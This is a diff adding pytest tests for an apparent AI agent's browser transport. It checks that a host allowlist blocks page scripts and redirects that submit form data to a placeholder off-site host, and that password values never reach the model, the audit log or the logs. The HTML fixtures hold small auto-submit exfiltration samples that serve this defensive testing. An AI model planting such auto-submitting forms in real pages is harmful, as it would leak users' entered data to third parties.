@@ -1,15 +1,21 @@
 """Browser module: the host allowlist, page rendering, and both transports."""
 
 import json
+import logging
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
+from types import SimpleNamespace
+from typing import ClassVar
 from urllib.parse import parse_qsl
 
 import pytest
-from conftest import FakeBrowserTransport
+from conftest import FakeBrowserTransport, ScriptedChatModel, read_audit, tool_call_msg
+from langchain_core.messages import AIMessage, ToolMessage
+from langgraph.types import Command
 
 from loom.browser import (
+    _PASSWORD_MASK,
     BrowserField,
     PageState,
     PlaywrightBrowserTransport,
@@ -18,9 +24,11 @@ from loom.browser import (
     render_page_state,
 )
 from loom.config import Settings
+from loom.graph import build_graph
 from loom.tools import make_tools
 
 URL = "http://127.0.0.1:9/form"
+OFFSITE = "http://offsite.invalid/collect"
 
 
 def form_page() -> PageState:
@@ -286,6 +294,239 @@ def test_real_transport_refuses_an_unlisted_host_before_navigating(tmp_path):
             transport.open("http://dead.host.invalid/form")
     finally:
         transport.close()
+
+
+class _PageSiteHandler(BaseHTTPRequestHandler):
+    """Serves per-path pages (and optional 302 redirects) and records every POST body."""
+
+    pages: ClassVar[dict] = {}
+    redirects: ClassVar[dict] = {}
+    record_path = None
+
+    def do_GET(self):
+        target = self.redirects.get(self.path)
+        if target is not None:
+            self.send_response(302)
+            self.send_header("Location", target)
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+            return
+        body = self.pages.get(self.path, "<html><body><h1>not found</h1></body></html>").encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", "0"))
+        fields = dict(parse_qsl(self.rfile.read(length).decode("utf-8")))
+        with self.record_path.open("a", encoding="utf-8") as f:
+            f.write(json.dumps({"path": self.path, "fields": fields}) + "\n")
+        body = b"<html><head><title>Done</title></head><body><h1>Submission received</h1></body></html>"
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, *args):
+        pass
+
+
+@pytest.fixture
+def page_site(tmp_path):
+    """An in-thread site whose pages and redirects each test fills in; POSTs land in a file."""
+    site = SimpleNamespace(pages={}, redirects={}, record_path=tmp_path / "posts.log", base="")
+    handler = type(
+        "_PageSite",
+        (_PageSiteHandler,),
+        {"pages": site.pages, "redirects": site.redirects, "record_path": site.record_path},
+    )
+    server = HTTPServer(("127.0.0.1", 0), handler)
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    site.base = f"http://127.0.0.1:{server.server_address[1]}"
+    yield site
+    server.shutdown()
+    server.server_close()
+    thread.join(timeout=5)
+
+
+def _posted(page_site) -> list[dict]:
+    if not page_site.record_path.exists():
+        return []
+    return [json.loads(line) for line in page_site.record_path.read_text(encoding="utf-8").splitlines()]
+
+
+@requires_chromium
+def test_oninput_self_submit_to_offsite_host_never_posts(tmp_path, page_site, caplog):
+    page_site.pages["/tricky.html"] = (
+        "<html><head><title>Tricky</title></head><body>"
+        f'<form action="{OFFSITE}" method="post">'
+        '<input id="name" name="name" oninput="this.form.submit()">'
+        '<button type="submit">Go</button></form></body></html>'
+    )
+    transport = PlaywrightBrowserTransport(_settings(tmp_path))
+    try:
+        with caplog.at_level(logging.DEBUG):
+            transport.open(page_site.base + "/tricky.html")
+            render = render_page_state(transport.fill({"name": "Ada Lovelace"}))
+    finally:
+        transport.close()
+
+    assert _posted(page_site) == [], "page scripts must not send a POST off the allowlist during fill"
+    assert transport._blocked == [OFFSITE], "the firewall refuses the request the page script started"
+    assert "offsite.invalid" not in render, "no off-site content reaches the model"
+    blocked_logs = [record for record in caplog.records if "host allowlist" in record.getMessage()]
+    assert blocked_logs, "every blocked request is logged as a warning"
+    for record in blocked_logs:
+        assert "offsite.invalid" in record.host and "/collect" not in record.host, "the log names scheme and host only"
+
+
+@requires_chromium
+def test_onload_self_submit_to_offsite_host_never_posts(tmp_path, page_site):
+    page_site.pages["/auto.html"] = (
+        "<html><head><title>Auto</title></head><body>"
+        f'<form action="{OFFSITE}" method="post"><input name="n" value="v"></form>'
+        "<script>window.onload = () => document.forms[0].submit()</script>"
+        "</body></html>"
+    )
+    transport = PlaywrightBrowserTransport(_settings(tmp_path))
+    try:
+        state = transport.open(page_site.base + "/auto.html")
+    finally:
+        transport.close()
+
+    assert _posted(page_site) == [], "the page's own load handler must not submit off the allowlist"
+    assert state.url == page_site.base + "/auto.html", "the page stays on the allowed origin"
+    assert transport._blocked == [OFFSITE], "the firewall aborts the scripted submit"
+
+
+@requires_chromium
+def test_redirect_to_offsite_is_aborted_page_never_lands_offsite(tmp_path, page_site):
+    page_site.redirects["/away"] = "http://offsite.invalid/x"
+    transport = PlaywrightBrowserTransport(_settings(tmp_path))
+    try:
+        with pytest.raises(RuntimeError) as exc_info:
+            transport.open(page_site.base + "/away")
+    finally:
+        transport.close()
+
+    assert transport._page is None, "a failed navigation leaves no usable page behind"
+    assert transport._blocked == ["http://offsite.invalid/x"], (
+        "the landing check records and refuses the redirect target: interception does not see redirects"
+    )
+    assert _posted(page_site) == []
+    message = str(exc_info.value)
+    assert "http://offsite.invalid/…" in message and "/x" not in message, "the failure names the redacted url only, never an off-site body"
+
+
+@requires_chromium
+def test_submit_refuses_a_formaction_outside_the_allowlist_before_clicking(tmp_path, page_site):
+    page_site.pages["/formaction.html"] = (
+        "<html><head><title>Formaction</title></head><body>"
+        f'<form action="/record" method="post"><input name="n" value="v">'
+        f'<button type="submit" formaction="{OFFSITE}">Go</button></form></body></html>'
+    )
+    transport = PlaywrightBrowserTransport(_settings(tmp_path))
+    try:
+        transport.open(page_site.base + "/formaction.html")
+        with pytest.raises(ValueError, match="LOOM_BROWSER_ALLOWED_HOSTS"):
+            transport.submit()
+    finally:
+        transport.close()
+
+    assert _posted(page_site) == [], "a refused submission must never be clicked"
+
+
+@requires_chromium
+def test_submit_uses_the_form_owning_the_clicked_button(tmp_path, page_site):
+    page_site.pages["/two-forms.html"] = (
+        "<html><head><title>Two forms</title></head><body>"
+        f'<form action="{OFFSITE}" method="post"><input name="a" value="1"></form>'
+        '<form action="/record" method="post"><input name="b" value="2">'
+        '<button type="submit">Go</button></form></body></html>'
+    )
+    transport = PlaywrightBrowserTransport(_settings(tmp_path))
+    try:
+        transport.open(page_site.base + "/two-forms.html")
+        outcome = transport.submit()
+    finally:
+        transport.close()
+
+    posts = _posted(page_site)
+    assert [post["path"] for post in posts] == ["/record"], "the click submits the form that owns the button"
+    assert outcome.accepted is True
+
+
+@requires_chromium
+def test_onsubmit_action_rewrite_is_blocked_and_never_accepted(tmp_path, page_site):
+    page_site.pages["/rewrite.html"] = (
+        "<html><head><title>Rewrite</title></head><body>"
+        f"<form action=\"/record\" method=\"post\" onsubmit=\"this.action='{OFFSITE}'\">"
+        '<input name="n" value="v"><button type="submit">Go</button></form></body></html>'
+    )
+    transport = PlaywrightBrowserTransport(_settings(tmp_path))
+    try:
+        transport.open(page_site.base + "/rewrite.html")
+        with pytest.raises(RuntimeError, match="blocked by the host allowlist"):
+            transport.submit()
+        assert transport._blocked == [OFFSITE], "the firewall refused the rewritten submission"
+    finally:
+        transport.close()
+
+    assert _posted(page_site) == [], "a blocked submission sends nothing"
+
+
+@requires_chromium
+def test_password_fields_are_masked_in_everything_the_model_sees(tmp_path, page_site, caplog):
+    page_site.pages["/secure.html"] = (
+        "<html><head><title>Secure</title></head><body>"
+        '<form action="/record" method="post">'
+        '<input id="user" name="user" type="text" value="plain-user">'
+        '<input id="pw" name="password" type="password" value="prefilled-secret-1">'
+        '<input id="pw2" name="masked_field" type="text" autocomplete="current-password" value="prefilled-secret-2">'
+        '<input id="pw3" name="empty_pw" type="password">'
+        '<button type="submit">Go</button></form></body></html>'
+    )
+    settings = _settings(tmp_path)
+    transport = PlaywrightBrowserTransport(settings)
+    scripted = [
+        tool_call_msg("browser_open", {"url": page_site.base + "/secure.html"}),
+        tool_call_msg("browser_fill", {"fields": {"password": "typed-secret-3"}}),
+        tool_call_msg("browser_submit", {}),
+        AIMessage(content="form submitted"),
+    ]
+    graph = build_graph(ScriptedChatModel(messages=iter(scripted)), settings, transports={"browser": transport})
+    config = {"configurable": {"thread_id": "secure"}}
+    secrets = ("prefilled-secret-1", "prefilled-secret-2", "typed-secret-3")
+    seen: list[str] = []
+    try:
+        with caplog.at_level(logging.DEBUG):
+            seen.append(render_page_state(transport.open(page_site.base + "/secure.html")))
+            seen.append(render_page_state(transport.fill({"password": "typed-secret-3"})))
+            seen.append(json.dumps(transport.pending_approval()))
+            paused = graph.invoke({"messages": [{"role": "user", "content": "send it"}], "run_id": "sec"}, config)
+            seen.append(json.dumps(paused["__interrupt__"][0].value))
+            result = graph.invoke(Command(resume={"decision": "approve"}), config)
+            seen.extend(m.content for m in result["messages"] if isinstance(m, ToolMessage))
+    finally:
+        transport.close()
+
+    opened = seen[0]
+    assert opened.count(f"= {_PASSWORD_MASK!r}") == 2, "both sensitive controls show the mask"
+    assert "empty_pw [password] ''" in opened, "an empty sensitive control still reads as empty"
+    assert "plain-user" in opened, "non-sensitive values stay readable"
+    assert _PASSWORD_MASK in seen[2], "the approval payload conveys filled state with the mask"
+    for surface in seen:
+        for secret in secrets:
+            assert secret not in surface, f"no password value reaches the model: {secret}"
+    for record in read_audit(tmp_path):
+        for secret in secrets:
+            assert secret not in record["args"], "the audit never records a password value"
+    for secret in secrets:
+        assert secret not in caplog.text, "no log record carries a password value"
 
 
 def test_real_transport_pending_approval_without_a_page_needs_no_browser(tmp_path):
